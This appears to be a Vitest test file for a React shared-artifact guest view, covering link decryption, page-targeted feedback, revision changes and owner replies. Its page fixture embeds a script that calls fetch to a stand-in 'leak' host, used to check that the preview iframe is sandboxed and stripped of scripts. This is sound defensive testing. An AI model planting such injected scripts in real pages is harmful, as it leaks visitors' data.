// @vitest-environment happy-dom
import { afterEach, describe, expect, it, vi } from "vitest";
import { cleanup, fireEvent, render, screen, waitFor } from "@testing-library/react";
import { SharedView } from "../Shared";
import { artifactRemarkPayload, loadShare, openFromLink, sealForLink, submitArtifactRemark, type LoadedShare } from "@/lib/sharing/sharing";
import type { PublicArtifactPayload } from "@ql/core/artifact/public-link-format";

afterEach(() => { cleanup(); localStorage.clear(); });
const page = (id: string, title: string) => {
  const html = `<html><head><title>${title}</title></head><body>${title}<script>fetch('https://example.invalid/leak')</script></body></html>`;
  return { id: `p-${id.repeat(24)}`, doc: `artifacts/p-${id.repeat(24)}.html`, title, format: "html" as const, html, bytes: new TextEncoder().encode(html).length };
};
const payload: PublicArtifactPayload = { kind: "artifact", schema: 1, title: "Settings design", owner: "Max", revision: "a".repeat(64), pages: [page("1", "Workspace settings"), page("2", "Usage")], threads: [] };
const share: Extract<LoadedShare, { kind: "artifact" }> = { status: "ready", kind: "artifact", id: "A".repeat(22), payload };
const key = "A".repeat(43);

describe("standalone public artifact guest", () => {
  it("decrypts only a valid artifact kind and never falls back malformed or unknown kinds to workflow", async () => {
    const read = async (value: unknown) => loadShare(share.id, key, vi.fn(async () => new Response(JSON.stringify(await sealForLink(key, "plan", JSON.stringify(value))))) as typeof fetch);
    expect(await read(payload)).toMatchObject({ status: "ready", kind: "artifact", payload });
    expect(await read({ ...payload, pages: [{ ...payload.pages[0], doc: "private/source.html" }], docs: { "03-plan.md": "must not fall back" } })).toMatchObject({ status: "error" });
    expect(await read({ kind: "future", docs: { "03-plan.md": "must not fall back" } })).toMatchObject({ status: "error" });
  });

  it("preserves the named target and draft while browsing and keeps both on failure", async () => {
    const send = vi.fn(async () => ({ ok: false as const, reason: "network" as const }));
    render(<SharedView state={share} onSend={vi.fn()} onArtifactSend={send} />);
    expect(screen.queryByRole("tab", { name: "Workflow" })).toBeNull();
    expect(screen.queryByText("Approve")).toBeNull();
    expect(screen.getByText("Whole artifact")).toBeTruthy();
    fireEvent.click(screen.getByRole("button", { name: "Give feedback" }));
    fireEvent.change(screen.getByRole("textbox", { name: "Your feedback" }), { target: { value: "Keep this exact page target" } });
    fireEvent.change(screen.getByLabelText(/^Artboard/), { target: { value: payload.pages[1]!.doc } });
    expect(screen.getByRole("status").textContent).toContain("Workspace settings");
    expect((screen.getByRole("textbox", { name: "Your feedback" }) as HTMLTextAreaElement).value).toBe("Keep this exact page target");
    fireEvent.click(screen.getByRole("button", { name: "Send feedback" }));
    await screen.findByRole("alert");
    expect(send).toHaveBeenCalledWith("", expect.objectContaining({ page: payload.pages[0]!.id, revision: payload.revision, text: "Keep this exact page target" }));
    expect(screen.getByRole("status").textContent).toContain("Workspace settings");
    const frame = document.querySelector("iframe")!;
    expect(frame.getAttribute("sandbox")).not.toContain("allow-scripts");
    expect(frame.srcdoc).not.toContain("<script");
  });

  it("sends whole or explicit page feedback with the exact public revision and no private path", async () => {
    const remark = { id: "comment-1", page: payload.pages[0]!.id, revision: payload.revision, text: "Use this", for: "agent" as const };
    const fetcher = vi.fn(async (_url: RequestInfo | URL, _init?: RequestInit) => new Response("{}"));
    expect(await submitArtifactRemark(share.id, key, "Gina", remark, payload, fetcher as typeof fetch)).toEqual({ ok: true });
    const body = JSON.parse(fetcher.mock.calls[0]![1]!.body as string);
    const sent = JSON.parse((await openFromLink(key, "feedback", body.payload))!);
    expect(sent.annotations[0]).toMatchObject({ blockId: payload.pages[0]!.doc, for: "agent", text: "Use this" });
    expect(JSON.parse(sent.annotations[0].originalText)).toEqual({ artifact: 1, page: payload.pages[0]!.id, revision: payload.revision, quote: "" });
    expect(artifactRemarkPayload("Gina", { ...remark, page: null, for: "person" }, payload)?.annotations[0]?.blockId).toBe("review");
    expect(artifactRemarkPayload("Gina", { ...remark, page: "private/source.html" }, payload)).toBeNull();
    expect(artifactRemarkPayload("Gina", { ...remark, revision: "b".repeat(64) }, payload)).toBeNull();
  });

  it("blocks a draft across a changed shared revision and only explicit Clear retargets", async () => {
    const send = vi.fn(async () => ({ ok: true as const }));
    const view = render(<SharedView state={share} onSend={vi.fn()} onArtifactSend={send} />);
    fireEvent.change(screen.getByRole("textbox", { name: "Your feedback" }), { target: { value: "Keep my draft" } });
    view.rerender(<SharedView state={{ ...share, payload: { ...payload, revision: "b".repeat(64) } }} onSend={vi.fn()} onArtifactSend={send} />);
    expect((screen.getByRole("button", { name: "Send feedback" }) as HTMLButtonElement).disabled).toBe(true);
    expect(send).not.toHaveBeenCalled();
    fireEvent.click(screen.getByRole("button", { name: "Clear target" }));
    expect((screen.getByRole("textbox", { name: "Your feedback" }) as HTMLTextAreaElement).value).toBe("Keep my draft");
    fireEvent.click(screen.getByRole("button", { name: "Send feedback" }));
    await waitFor(() => expect(send).toHaveBeenCalledWith("", expect.objectContaining({ page: null, revision: "b".repeat(64) })));
    expect(screen.queryByText(/agent.*reply.*soon/i)).toBeNull();
  });

  it("keeps sent receipts on reopening and shows only the owner's published reply", async () => {
    const send = vi.fn(async (_name: string, _remark: { id: string }) => ({ ok: true as const }));
    const view = render(<SharedView state={share} onSend={vi.fn()} onArtifactSend={send} />);
    fireEvent.change(screen.getByRole("textbox", { name: "Your feedback" }), { target: { value: "Please check this spacing" } });
    fireEvent.click(screen.getByRole("button", { name: "Send feedback" }));
    await screen.findByLabelText("Sent");
    const annotation = send.mock.calls[0]![1]!.id;
    view.unmount();
    render(<SharedView state={{ ...share, payload: { ...payload, threads: [{ remoteId: `${share.id}:0:${annotation}`, created: 1, doc: "artifact", state: "resolved", replies: [{ id: "owner-reply", author: { name: "Max", email: "" }, text: "Checked the spacing in the App.", at: 2, via: "app" }] }] } }} onSend={vi.fn()} onArtifactSend={send} />);
    expect(screen.getByLabelText("Sent").textContent).toContain("Please check this spacing");
    expect(screen.getByText(/Checked the spacing in the App/)).toBeTruthy();
    expect(screen.getByText("Resolved")).toBeTruthy();
  });
});
